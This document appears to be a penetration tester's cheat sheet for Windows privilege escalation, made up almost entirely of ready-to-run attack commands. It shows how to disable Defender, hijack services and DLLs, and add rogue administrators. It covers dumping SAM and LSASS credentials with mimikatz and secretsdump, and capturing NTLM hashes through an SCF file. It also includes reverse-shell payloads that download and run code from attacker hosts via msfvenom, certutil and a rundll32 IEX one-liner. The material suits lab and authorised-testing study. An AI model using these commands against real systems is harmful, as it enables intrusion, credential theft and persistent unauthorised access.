# Windows Privilege Escalation

## Useful Tools

| Tool | Description |
|---|---|
| [Seatbelt](https://github.com/GhostPack/Seatbelt) | C# local priv esc checks |
| [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) | Automated priv esc enumeration |
| [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) | PowerShell priv esc finder |
| [SharpUp](https://github.com/GhostPack/SharpUp) | C# version of PowerUp |
| [Watson](https://github.com/rasta-mouse/Watson) | .NET missing KB / exploit suggester |
| [LaZagne](https://github.com/AlessandroZ/LaZagne) | Retrieve stored passwords |
| [SessionGopher](https://github.com/Arvanaghi/SessionGopher) | Extract saved session info (PuTTY, WinSCP, RDP, etc.) |
| [WES-NG](https://github.com/bitsadmin/wesng) | Windows Exploit Suggester based on systeminfo |
| [JAWS](https://github.com/411Hall/JAWS) | PowerShell 2.0 priv esc enumeration |
| [PrivescCheck](https://github.com/itm4n/PrivescCheck) | PowerShell priv esc enumeration |
| [nishang](https://github.com/samratashok/nishang) | PowerShell offensive framework |
| [Priv2Admin](https://github.com/gtworek/Priv2Admin) | OS privileges to SYSTEM reference |

- Upload tools to `C:\Windows\Temp` (writable by BUILTIN\Users)
- Precompiled Seatbelt/SharpUp: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

### Run PowerUp

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

## Initial Enumeration

### System Information
```cmd
systeminfo
wmic qfe list brief
hostname
```
```powershell
Get-HotFix | ft -AutoSize
[environment]::OSVersion.Version
```

#### Windows Kernel Versions

```
Kernel 6.1 - Windows 7 / Windows Server 2008 R2
Kernel 6.2 - Windows 8 / Windows Server 2012
Kernel 6.3 - Windows 8.1 / Windows Server 2012 R2
Kernel 10  - Windows 10 / Windows Server 2016 / Windows Server 2019 / Windows 11 / Windows Server 2022
```

### Running Processes & Services
```cmd
tasklist /svc
wmic product get name
netstat -ano
```
```powershell
Get-WmiObject -Class Win32_Product | select Name, Version
Get-Process
Get-Service | Where-Object {$_.Status -eq "Running"}
```

### User & Group Info
```cmd
whoami /priv
whoami /groups
echo %USERNAME%
net user
net localgroup
net localgroup administrators
net accounts
query user
```

### Network Info
```cmd
ipconfig /all
arp -a
route print
```

### Environment Variables
```cmd
set
```

### Enumerating Protections
```powershell
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

### Installed Programs
```cmd
wmic product get name
```
```powershell
Get-WmiObject -Class Win32_Product | select Name, Version
```

### Named Pipes
```cmd
pipelist.exe /accepteula
accesschk.exe /accepteula \\.\Pipe\lsass -v
accesschk.exe -w \pipe\* -v
```
```powershell
gci \\.\pipe\
```

### Important Files
```cmd
dir %SYSTEMROOT%\System32\drivers\etc\hosts
dir %SYSTEMROOT%\System32\drivers\etc\networks
dir %SYSTEMROOT%\Prefetch
dir %WINDIR%\system32\config\AppEvent.Evt
dir %WINDIR%\system32\config\SecEvent.Evt
```

### PowerShell Setup
```powershell
powershell.exe -nop -ep bypass
Get-ExecutionPolicy
Set-ExecutionPolicy Unrestricted
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Token Privileges (Low Hanging Fruit)

- Check current tokens and see if you can escalate: `whoami /priv`
- Reference: https://github.com/gtworek/Priv2Admin

```
SeImpersonatePrivilege          -> PrintSpoofer, Juicy Potato, Rogue Potato, Hot Potato
SeAssignPrimaryTokenPrivilege   -> Juicy Potato
SeTakeOwnershipPrivilege        -> become owner of any object, modify DACL to grant access
SeBackupPrivilege               -> copy SAM/SYSTEM, dump hashes with impacket
```

- If machine is >= Windows 10 1809 / Windows Server 2019 -> Try Rogue Potato
- If machine is < Windows 10 1809 / Windows Server 2019 -> Try Juicy Potato

### SeBackupPrivilege

- If you have SeBackupPrivilege, you can backup the registry hives and dump hashes
- Reference: https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md

```cmd
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
```

- Download files and use impacket secretsdump

```bash
python3 /opt/impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
```

## Weak Permissions

### Permissive File System ACLs
```powershell
.\SharpUp.exe audit
```
```cmd
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
- If BUILTIN\Users or Everyone has (F) or (M) on a service binary, replace it with a malicious one
- `cmd /c copy /Y malicious.exe "C:\path\to\service.exe"` then `sc start ServiceName`

### Weak Service Permissions
```cmd
accesschk.exe /accepteula -quvcw ServiceName
sc config ServiceName binpath= "cmd /c net localgroup administrators htb-student /add"
sc stop ServiceName
sc start ServiceName
```
- Check for `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG` for `NT AUTHORITY\Authenticated Users` or similar

### Service Escalation via binpath Change

```cmd
sc.exe qc VulnerableService
sc.exe config VulnerableService binPath= "C:\path\to\payload.exe"
sc.exe start VulnerableService
```

### Unquoted Service Path
```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
sc qc ServiceName
```
```powershell
Get-CIMInstance -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
- Windows tries: `C:\Program.exe`, `C:\Program Files.exe`, `C:\Program Files (x86)\System.exe`, etc.
- Place executable at one of these paths if writable

### Permissive Registry ACLs
```cmd
accesschk.exe /accepteula "username" -kvuqsw hklm\System\CurrentControlSet\services
```
```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName -Name "ImagePath" -Value "C:\path\to\payload.exe"
```

### Modifiable Registry Autorun Binary
```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

### AlwaysInstallElevated

- Both must be set to 1 for exploitation:

```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

- Generate malicious MSI and install:

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=ATTACKER_IP -f msi -o setup.msi
```
```cmd
msiexec /quiet /qn /i C:\Temp\setup.msi
```

### Startup Applications

- Check if BUILTIN\Users has full access (F) to the Startup directory:

```cmd
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

- Drop a payload there; it executes when an admin logs in

### DLL Hijacking

- Use Process Monitor (procmon) to find DLLs with `NAME NOT FOUND` result loaded by a vulnerable service
- Compile a malicious DLL and place it in the writable search path

```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
```
```cmd
sc stop dllsvc & sc start dllsvc
```

## Kernel Exploits

### Enumerating Missing Patches
```cmd
systeminfo
wmic qfe list brief
```
```powershell
Get-Hotfix
```

- Kernel exploit repos: https://github.com/SecWiki/windows-kernel-exploits

### Notable Vulnerabilities
- **MS08-067**: RCE in Server service (Windows 2000/2003/2008, XP/Vista)
- **MS17-010 (EternalBlue)**: SMBv1 RCE - can also be used for local priv esc via port forwarding
- **CVE-2020-0668**: Windows Kernel Elevation of Privilege via Service Tracing arbitrary file move
- **CVE-2021-1675/CVE-2021-34527 (PrintNightmare)**: Print Spooler RCE/LPE
- Windows 10 exploits collection: https://github.com/nu11secur1ty/Windows10Exploits

### HiveNightmare (CVE-2021-36934)
```cmd
icacls c:\Windows\System32\config\SAM
```
- If BUILTIN\Users has (RX), the system is vulnerable
```powershell
.\HiveNightmare.exe
```
```bash
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```

### PrintNightmare Local Priv Esc
```powershell
ls \\localhost\pipe\spoolss
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

## Vulnerable Services
- Always enumerate installed software: `wmic product get name`
- Search for known vulnerable versions (e.g., Druva inSync 6.6.3, Splunk Universal Forwarder)
- Check for localhost-only services: `netstat -ano | findstr LISTENING`
- Map PID to process: `get-process -Id <PID>`

## User Account Control (UAC) Bypass

### Check UAC Status
```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

### UAC Bypass via DLL Hijacking (SystemPropertiesAdvanced.exe)
- Target: `srrstr.dll` loaded by 32-bit `SystemPropertiesAdvanced.exe`
- Place malicious DLL in `C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll`
```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

### UACME
- https://github.com/hfiref0x/UACME - comprehensive list of UAC bypasses by Windows build

## Credential Hunting

### Search for Files with Passwords
```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
findstr /spin "password" *.*

dir c:\*password* /s
dir c:\*pass* /s
dir c:\*login* /s
dir c:\*.key /s
dir c:\*.pwd* /s
dir c:\*.config* /s
dir /S /B *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
```powershell
Get-ChildItem -Recurse -Path "C:\" -Include @("*.txt","*.ini","*.cfg","*.config","*.xml","*.ps1","*.yml","*.bat","*.vbs","*.py","*.yaml") -ErrorAction SilentlyContinue | Select-String "password"
Get-ChildItem -Recurse -Directory -Filter "Confidential" -ErrorAction SilentlyContinue
Get-ChildItem -Path "C:\Users" -Filter *.kdbx -Recurse -ErrorAction SilentlyContinue
```

### Unattended Setup Files
- May contain base64-encoded credentials

```cmd
dir C:\Windows\sysprep\sysprep.xml
dir C:\Windows\sysprep\sysprep.inf
dir C:\Windows\Panther\Unattended.xml
dir C:\Windows\Panther\Unattend.xml
dir C:\Windows\Panther\Unattend\Unattend.xml
dir C:\Windows\System32\Sysprep\unattend.xml
dir C:\unattend.txt
dir C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

### Search Registry for Passwords
```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### PowerShell History
```cmd
dir %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
```

### Credentials in Process Command Lines

```powershell
Get-CimInstance Win32_Process | Select-Object ProcessId,Name,CommandLine | Format-List
```
```cmd
wmic process get processid,name,commandline
```

### LSASS Credential Dumping
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
```
mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonpasswords
```

### LaZagne
```cmd
start LaZagne.exe all
```
- Modules: browsers, chats, mails, memory, sysadmin, windows, wifi

### Additional Credential Locations
- Passwords in Group Policy (SYSVOL share)
- `web.config` files on dev machines
- `unattend.xml`
- AD user/computer description fields
- KeePass databases (`*.kdbx`)
- Files named `pass.txt`, `passwords.docx`, etc.
- VNC config files: `dir C:\*.vnc.ini /s /b` and `dir C:\*ultravnc.ini /s /b`

### Credential Search Terms
Key terms to grep for: `password`, `passphrase`, `keys`, `username`, `creds`, `users`, `passkeys`, `configuration`, `dbcredential`, `dbpassword`, `pwd`, `login`, `credentials`

## Interacting with Users

### SCF File Attack (Steal NTLMv2 Hashes)
```
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
- Name it `@Inventory.scf` and place on heavily used file share
- Start Responder: `sudo responder -wrf -v -I tun0`
- Crack captured NTLMv2: `hashcat -m 5600 hash.txt rockyou.txt`

### Process Command Line Monitoring
```powershell
while($true) {
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

### Traffic Capture
- If Wireshark is installed, unprivileged users may be able to capture traffic
- Use `net-creds` to sniff passwords from pcap or live interface

## Post-Exploitation Quickwins

### Add Admin & Enable RDP
```cmd
net user /add hacked Password1
net localgroup administrators hacked /add
net localgroup "Remote Desktop Users" hacked /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service type = REMOTEDESKTOP mode = ENABLE scope = CUSTOM addresses = 10.0.0.1
```

### Disable/Enable Group Policy
```cmd
REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1 /f
```

### Run Executable in Background
```cmd
start /B program
```

### SMB File Transfer
- On Kali:
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```
- On Windows:
```cmd
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```

### xfreerdp
```bash
xfreerdp /v:TARGET_IP /u:USER /p:PASS /cert:ignore /drive:/usr/share/windows-resources,share /dynamic-resolution
```

## Scheduled Tasks

### Enumerate Scheduled Tasks
```cmd
schtasks /query /fo LIST /v
```
```powershell
Get-ScheduledTask | select TaskName, State
```

### Exploit Writable Task Scripts
- If a scheduled task runs a script you can write to:
```cmd
schtasks /query /fo LIST /v | findstr /B /C:"Task To Run" /C:"Run As User" /C:"Schedule Type"
```
- Check the script's ACL:
```cmd
icacls C:\Scripts\task_script.bat
```
- If writable, replace contents with a reverse shell or adduser command

## User/Computer Description Field
- Sysadmins sometimes store passwords in user or computer description fields
```powershell
Get-LocalUser | select Name, Description
```
```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

## LOLBAS (Living Off The Land Binaries and Scripts)

- https://lolbas-project.github.io/

### certutil - File Transfer / Encode
```cmd
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.exe C:\Windows\Temp\shell.exe
certutil -encode payload.exe payload.b64
certutil -decode payload.b64 payload.exe
```

### rundll32 - Execute DLL
```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.3/shell.ps1')");
```

## CVE-2019-1388 - Windows Certificate Dialog LPE
- Affects older Windows versions (pre-patch)
- Run a signed executable as admin, click "Show information about the publisher's certificate"
- In the Issuer Statement link, a browser opens as SYSTEM
- Use browser's "Save As" dialog to launch `cmd.exe`

## Legacy Operating Systems

### Windows Server 2008 / Windows 7
- End-of-Life, no more security patches
- Missing modern protections (AMSI, Credential Guard, etc.)
- Use **Sherlock** or **Windows-Exploit-Suggester** for kernel exploit identification:
```powershell
# Sherlock
Set-ExecutionPolicy bypass -Scope process
Import-Module .\Sherlock.ps1
Find-AllVulns
```
```bash
# Windows Exploit Suggester
python2.7 windows-exploit-suggester.py --update
python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
```

### Notable Legacy Exploits
- **MS10-092** (Server 2008 R2) - Task Scheduler XML Privilege Escalation
- **MS16-032** (Windows 7/8.1, Server 2008/2012) - Secondary Logon Race Condition
```powershell
# MS16-032
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

## Windows Hardening Checklist
- Install OS from trusted media, keep patched (WSUS)
- Apply Group Policy baselines (DISA STIGs, Microsoft Security Compliance Toolkit)
- Enforce least privilege: remove users from local Administrators, use tiered admin accounts
- Restrict PowerShell with Constrained Language Mode
- Enable Credential Guard, LSA Protection, and Device Guard where possible
- Disable LLMNR/NBT-NS
- Implement LAPS for local admin password management
- Enable and centralize logging (Sysmon, Windows Event Forwarding)
- Disable unnecessary services and protocols (SMBv1, remote registry)
- Enforce strong password policy and account lockout
- Enable multi-factor authentication for privileged access

## Resources
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
- https://github.com/hfiref0x/UACME
- https://lolbas-project.github.io/
- https://wadcoms.github.io/
- https://ppn.snovvcrash.rocks/pentest/infrastructure/post-exploitation
